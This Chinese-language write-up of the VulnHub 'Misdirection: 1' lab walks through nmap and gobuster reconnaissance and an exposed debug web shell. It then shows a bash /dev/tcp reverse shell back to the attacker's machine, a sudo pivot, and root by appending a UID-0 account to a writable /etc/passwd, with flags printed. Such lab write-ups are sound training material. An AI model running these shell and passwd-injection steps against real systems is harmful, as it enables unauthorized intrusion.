# MISDIRECTION:1主机渗透实现

- 靶机地址:https://www.vulnhub.com/entry/misdirection-1,371/
- 下载地址:https://download.vulnhub.com/misdirection/Misdirection.zip

## 信息收集:

### 主机发现:

- 当前主机IP段:`192.168.0.2`,当前主机IP:`192.168.2.2`

- ```shell
  └─$ sudo nmap -sn --min-rate 10000 192.168.2.1/24                            
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 03:24 EDT
  Nmap scan report for 192.168.2.1
  Host is up (0.00064s latency).
  MAC Address: 00:50:56:C0:00:01 (VMware)
  Nmap scan report for 192.168.2.9
  Host is up (0.00030s latency).
  MAC Address: 00:0C:29:AA:9E:2F (VMware)
  Nmap scan report for 192.168.2.254
  Host is up (0.000098s latency).
  MAC Address: 00:50:56:E4:FB:DB (VMware)
  Nmap scan report for 192.168.2.2
  Host is up.
  Nmap done: 256 IP addresses (4 hosts up) scanned in 13.31 seconds
  
  ```

- 靶机IP地址:`192.168.2.9`

### 端口扫描

- TCP扫描

- ```shell
  └─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.9 -oA Nmap-scan/sT
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 03:25 EDT
  Nmap scan report for 192.168.2.9
  Host is up (0.00029s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  3306/tcp open  mysql
  8080/tcp open  http-proxy
  MAC Address: 00:0C:29:AA:9E:2F (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds
  ```

- UCP扫描

- ```shell
  └─$ sudo nmap -sU --min-rate 10000 --top-port 20 192.168.2.9 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 03:27 EDT
  Nmap scan report for 192.168.2.9
  Host is up (0.00024s latency).
  
  PORT      STATE         SERVICE
  53/udp    closed        domain
  67/udp    open|filtered dhcps
  68/udp    open|filtered dhcpc
  69/udp    open|filtered tftp
  123/udp   open|filtered ntp
  135/udp   closed        msrpc
  137/udp   open|filtered netbios-ns
  138/udp   open|filtered netbios-dgm
  139/udp   closed        netbios-ssn
  161/udp   open|filtered snmp
  162/udp   open|filtered snmptrap
  445/udp   open|filtered microsoft-ds
  500/udp   open|filtered isakmp
  514/udp   open|filtered syslog
  520/udp   open|filtered route
  631/udp   open|filtered ipp
  1434/udp  closed        ms-sql-m
  1900/udp  open|filtered upnp
  4500/udp  open|filtered nat-t-ike
  49152/udp open|filtered unknown
  MAC Address: 00:0C:29:AA:9E:2F (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
  ```

### 服务及操作系统扫描

- ```shell
  └─$ sudo nmap -sC -sV -O -p22,80,3306,8080 192.168.2.9 -oA Nmap-scan/sC   
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 03:28 EDT
  Nmap scan report for 192.168.2.9
  Host is up (0.00032s latency).
  
  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
  |   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
  |_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
  80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
  |_http-title: Site doesn't have a title (text/html; charset=utf-8).
  |_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
  3306/tcp open  mysql   MySQL (unauthorized)
  8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-open-proxy: Proxy might be redirecting requests
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  MAC Address: 00:0C:29:AA:9E:2F (VMware)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Device type: general purpose
  Running: Linux 3.X|4.X
  OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
  OS details: Linux 3.2 - 4.9
  Network Distance: 1 hop
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 52.67 seconds
  
  ```

### 基础漏洞扫描

- ```shell
  └─$ sudo nmap --script=vuln -p22,80,3306,8080 192.168.2.9 -oA Nmap-scan/Script
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 03:39 EDT
  Nmap scan report for 192.168.2.9
  Host is up (0.00029s latency).
  
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  | http-sql-injection: 
  |   Possible sqli for queries:
  |     http://192.168.2.9:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
  |     http://192.168.2.9:80/init/default/user/register?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
  |     http://192.168.2.9:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
  |     http://192.168.2.9:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
  |     http://192.168.2.9:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Fsupport%27%20OR%20sqlspider
  |     http://192.168.2.9:80/init/default/user/register?_next=%2Finit%2Fdefault%2Fsupport%27%20OR%20sqlspider
  |     http://192.168.2.9:80/init/default/user/login?_next=%2Finit%2Fdefault%2Fsupport%27%20OR%20sqlspider
  |     http://192.168.2.9:80/init/default/user/register?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
  |     http://192.168.2.9:80/init/default/user/login?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider
  |     http://192.168.2.9:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider
  |_    http://192.168.2.9:80/init/default/user/register?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  | http-csrf: 
  | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.9
  |   Found the following possible CSRF vulnerabilities: 
  |     
  |     Path: http://192.168.2.9:80/init/default/user/request_reset_password?_next=/init/default/index
  |     Form id: auth_user_email__row
  |     Form action: #
  |     
  |     Path: http://192.168.2.9:80/init/default/user/register?_next=/init/default/index
  |     Form id: auth_user_first_name__row
  |_    Form action: #
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  | http-enum: 
  |   /admin/: Possible admin folder
  |   /admin/admin/: Possible admin folder
  |   /admin/backup/: Possible backup
  |   /admin/download/backup.sql: Possible database backup
  |   /examples/: Sample scripts
  |   /admin/libraries/ajaxfilemanager/ajaxfilemanager.php: Log1 CMS
  |   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload
  |   /admin/includes/tiny_mce/plugins/tinybrowser/upload.php: CompactCMS or B-Hind CMS/FCKeditor File upload
  |   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload
  |   /admin/jscript/upload.php: Lizard Cart/Remote File upload
  |   /admin/jscript/upload.html: Lizard Cart/Remote File upload
  |   /admin/jscript/upload.pl: Lizard Cart/Remote File upload
  |_  /admin/jscript/upload.asp: Lizard Cart/Remote File upload
  3306/tcp open  mysql
  8080/tcp open  http-proxy
  | http-enum: 
  |   /wordpress/: Blog
  |   /wordpress/wp-login.php: Wordpress login page.
  |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
  |   /debug/: Potentially interesting folder
  |   /development/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
  |   /help/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
  |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
  |   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
  |   /manual/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
  |_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
  MAC Address: 00:0C:29:AA:9E:2F (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 1174.97 seconds
  
  ```



## web页面发现

### gobuster扫描

- ```shell
  └─$ sudo gobuster dir -u http://192.168.2.9:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster -x txt,php,sql
  [sudo] password for kali: 
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://192.168.2.9:8080/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,php,sql
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.php                 (Status: 403) [Size: 292]
  /help                 (Status: 301) [Size: 316] [--> http://192.168.2.9:8080/help/]
  /images               (Status: 301) [Size: 318] [--> http://192.168.2.9:8080/images/]
  /scripts              (Status: 301) [Size: 319] [--> http://192.168.2.9:8080/scripts/]
  /css                  (Status: 301) [Size: 315] [--> http://192.168.2.9:8080/css/]
  /wordpress            (Status: 301) [Size: 321] [--> http://192.168.2.9:8080/wordpress/]
  /development          (Status: 301) [Size: 323] [--> http://192.168.2.9:8080/development/]
  /manual               (Status: 301) [Size: 318] [--> http://192.168.2.9:8080/manual/]
  /js                   (Status: 301) [Size: 314] [--> http://192.168.2.9:8080/js/]
  /shell                (Status: 301) [Size: 317] [--> http://192.168.2.9:8080/shell/]
  /debug                (Status: 301) [Size: 317] [--> http://192.168.2.9:8080/debug/]
  /.php                 (Status: 403) [Size: 292]
  /server-status        (Status: 403) [Size: 301]
  Progress: 882240 / 882244 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```

- 由于管理员配置错误,导致前台可以直接访问shell,相当于获得了初始shell



### 获得初始shell

- debug模式

- ![image-20230821113325566](https://raw.githubusercontent.com/r0o983/images/main/202308211133724.png)

- 反弹到本地主机操作.`bash -c "/bin/bash -i >& /dev/tcp/192.168.2.2/1234 0>&1";`

- 本地开启监听,等待连接

- ```shell
  └─$ nc -nvlp 1234
  listening on [any] 1234 ...
  connect to [192.168.2.2] from (UNKNOWN) [192.168.2.9] 37912
  bash: cannot set terminal process group (1046): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@misdirection:/var/www/html/debug$ uname -a
  uname -a
  Linux misdirection 4.15.0-50-generic #54-Ubuntu SMP Mon May 6 18:46:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  www-data@misdirection:/var/www/html/debug$ ip a 
  ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
      link/ether 00:0c:29:aa:9e:2f brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.9/24 brd 192.168.2.255 scope global dynamic ens33
         valid_lft 1480sec preferred_lft 1480sec
      inet6 fe80::20c:29ff:feaa:9e2f/64 scope link 
         valid_lft forever preferred_lft forever
  www-data@misdirection:/var/www/html/debug$ sudo -l
  sudo -l
  Matching Defaults entries for www-data on localhost:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User www-data may run the following commands on localhost:
      (brexit) NOPASSWD: /bin/bash
  www-data@misdirection:/var/www/html/debug$ 
  
  ```

## 提权

- 通过`sudo -l `可以看到用户`brexit`在可以在不需要密码的情况下直接使用`/bin/bash`,尝试切换用户到`brexit`

- 成功切换到用户`brexit`

- ```shell
  www-data@misdirection:/var/www/html/debug$ sudo -l 
  sudo -l
  Matching Defaults entries for www-data on localhost:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User www-data may run the following commands on localhost:
      (brexit) NOPASSWD: /bin/bash
  www-data@misdirection:/var/www/html/debug$ sudo -u brexit /bin/bash
  sudo -u brexit /bin/bash
  whoami
  brexit
  uname -a
  Linux misdirection 4.15.0-50-generic #54-Ubuntu SMP Mon May 6 18:46:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  
  ## 提升shell交互性
  python3 -c 'import pty;pty.spawn("/bin/bash")';
  brexit@misdirection:/var/www/html/debug$ ip a
  ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
      link/ether 00:0c:29:aa:9e:2f brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.9/24 brd 192.168.2.255 scope global dynamic ens33
         valid_lft 960sec preferred_lft 960sec
      inet6 fe80::20c:29ff:feaa:9e2f/64 scope link 
         valid_lft forever preferred_lft forever
  brexit@misdirection:/var/www/html/debug$ uname -a
  uname -a
  Linux misdirection 4.15.0-50-generic #54-Ubuntu SMP Mon May 6 18:46:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  brexit@misdirection:/var/www/html/debug$ id
  id
  uid=1000(brexit) gid=1000(brexit) groups=1000(brexit),24(cdrom),30(dip),46(plugdev),108(lxd)
  brexit@misdirection:/var/www/html/debug$ 
  
  ```

- 获得用户`flag`

- ```shell
  brexit@misdirection:/var/www/html/debug$ cd ~
  cd ~
  brexit@misdirection:~$ pwd
  pwd
  /home/brexit
  brexit@misdirection:~$ ls -lhai
  ls -lhai
  total 60K
  402287 drwxr-xr-x  6 brexit brexit 4.0K Jun  1  2019 .
  393218 drwxr-xr-x  3 root   root   4.0K Jun  1  2019 ..
  403447 -rw-------  1 brexit brexit    0 Jun  1  2019 .bash_history
  402289 -rw-r--r--  1 brexit brexit  220 Apr  4  2018 .bash_logout
  402290 -rw-r--r--  1 brexit brexit 3.7K Apr  4  2018 .bashrc
  402295 drwx------  3 brexit brexit 4.0K Jun  1  2019 .cache
  402297 drwx------  3 brexit brexit 4.0K Jun  1  2019 .gnupg
  402259 drwxrwxr-x  3 brexit brexit 4.0K Jun  1  2019 .local
  402288 -rw-r--r--  1 brexit brexit  807 Apr  4  2018 .profile
  402215 -rw-rw-r--  1 brexit brexit   66 Jun  1  2019 .selected_editor
  393356 -rw-------  1 brexit brexit 9.2K Jun  1  2019 .viminfo
  402285 -rwxrwxr-x  1 brexit brexit   90 Jun  1  2019 start-vote.sh
  393358 -r--r-----  1 brexit brexit   33 Jun  1  2019 user.txt
  402661 drwxrwxr-x 16 brexit brexit 4.0K Aug 20 15:22 web2py
  brexit@misdirection:~$ cat us
  cat user.txt 
  404b9193154be7fbbc56d7534cb26339
  brexit@misdirection:~$ 
  ```

- 查看当前`/etc/passwd`文件,发现文件属组为`brexit`,尝试编辑提权

- ```shell
  brexit@misdirection:/var/www/html/debucat /eam  pass
  cat /etc/passwd
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
  systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
  syslog:x:102:106::/home/syslog:/usr/sbin/nologin
  messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
  _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
  lxd:x:105:65534::/var/lib/lxd/:/bin/false
  uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
  dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
  landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
  pollinate:x:109:1::/var/cache/pollinate:/bin/false
  sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
  brexit:x:1000:1000:brexit:/home/brexit:/bin/bash
  mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
  brexit@misdirection:/var/www/html/debug$ ls -lhai /e    pass
  ls -lhai /etc/passwd
  153253 -rwxrwxr-- 1 root brexit 1.6K Jun  1  2019 /etc/passwd
  ```

- 增加新用户,写入root权限

  1. 使用openssl协议生成密码
  2. passwd 指定用于生成密码哈希值
  3. -1 指定`openssl passwd` 选项,用于表示使用MD5算法
  4. 123456 实际密码
  5. 将获取到的密码值写入到`/etc/passwd`文件中

- 成功获取root

- ```shell
  brexit@misdirection:/var/www/html/debug$ echo "rookie:$1$zeSZ.6Bl$uTrk7YihGqjrPlslUqBIO1:0:0:root:/root:/bin/bash" >> /etc/passwd
  <C4gyJaJ7t/:0:0:root:/root:/bin/bash" >> /etc/passwd
  brexit@misdirection:/var/www/html/debug$ su rookie
  su rookie
  Password: 123456
  
  root@misdirection:/var/www/html/debug#  whoami
   whoami
  root
  root@misdirection:/var/www/html/debug# uname -a
  uname -a
  Linux misdirection 4.15.0-50-generic #54-Ubuntu SMP Mon May 6 18:46:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  root@misdirection:/var/www/html/debug# ip a
  ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
      link/ether 00:0c:29:aa:9e:2f brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.9/24 brd 192.168.2.255 scope global dynamic ens33
         valid_lft 1403sec preferred_lft 1403sec
      inet6 fe80::20c:29ff:feaa:9e2f/64 scope link 
         valid_lft forever preferred_lft forever
  root@misdirection:/var/www/html/debug# cd ~
  cd ~
  root@misdirection:~# ls -lhai
  ls -lhai
  total 60K
  524292 drwx------  6 root root 4.0K Sep 24  2019 .
       2 drwxr-xr-x 23 root root 4.0K Jun  1  2019 ..
  524356 -rw-------  1 root root   90 Sep 24  2019 .bash_history
  525209 -rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
  524341 drwx------  2 root root 4.0K Jun  1  2019 .cache
  524344 drwx------  3 root root 4.0K Jun  1  2019 .gnupg
  543486 drwxr-xr-x  3 root root 4.0K Jun  1  2019 .local
  539567 -rw-------  1 root root  400 Jun  1  2019 .mysql_history
  525210 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
  524352 -r--------  1 root root   33 Jun  1  2019 root.txt
  538555 drwx------  2 root root 4.0K Jun  1  2019 .ssh
  524365 -rw-------  1 root root  12K Sep 24  2019 .viminfo
  540409 -rw-r--r--  1 root root  180 Jun  1  2019 .wget-hsts
  root@misdirection:~# cat ro
  cat root.txt 
  0d2c6222bfdd3701e0fa12a9a9dc9c8c
  root@misdirection:~# 
  ```